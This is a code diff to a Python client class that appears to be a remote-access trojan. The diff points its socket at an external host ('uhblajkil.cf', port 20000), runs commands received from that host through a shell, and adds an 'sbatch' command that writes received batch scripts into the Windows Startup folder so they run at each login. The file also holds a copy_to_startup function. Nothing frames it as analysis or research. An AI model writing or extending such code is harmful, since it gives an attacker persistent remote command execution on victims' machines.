@@ -13,7 +13,7 @@ class Socket:
     def connect_to_server(self):
         try:
             self.active_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.active_socket.connect((socket.gethostname(), 20000))
+            self.active_socket.connect(("uhblajkil.cf", 20000))
             Socket.established = True
             print("Connection established")
         except (ConnectionRefusedError, TimeoutError, socket.error):
@@ -31,6 +31,8 @@ class Socket:
         if cmd[0:5] == "batch":
             execute_batch_script(cmd[6:])
             return True
+        if cmd[0:6] == "sbatch":
+            execute_batch_script(cmd[7:], startup=True)
         else:
             try:
                 output = check_output(cmd, shell=True)
@@ -50,16 +52,23 @@ class Socket:
             self.established = False
 
 
-def execute_batch_script(script):
+def execute_batch_script(script, startup=False):
     if not script:
         return False
     script = script.replace("/n", "\n")
-    path = getenv("temp") + "\\" + "mat-debug-1692.bat"
-    with open(path, "w+")as f:
-        f.write(script)
-    startfile(path)
-    # remove(path)
-    return True
+    if not startup:
+        path = getenv("temp") + "\\" + "mat-debug-1692.bat"
+        with open(path, "w+")as f:
+            f.write(script)
+        startfile(path)
+        # remove(path)
+        return True
+    else:
+        path = "C:\\Users\\" + getlogin() + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\mat-debug-1692.bat"
+        with open(path , "w+")as f:
+            f.write(script)
+        startfile(path)
+        return True
 
 
 def copy_to_startup(file_name):
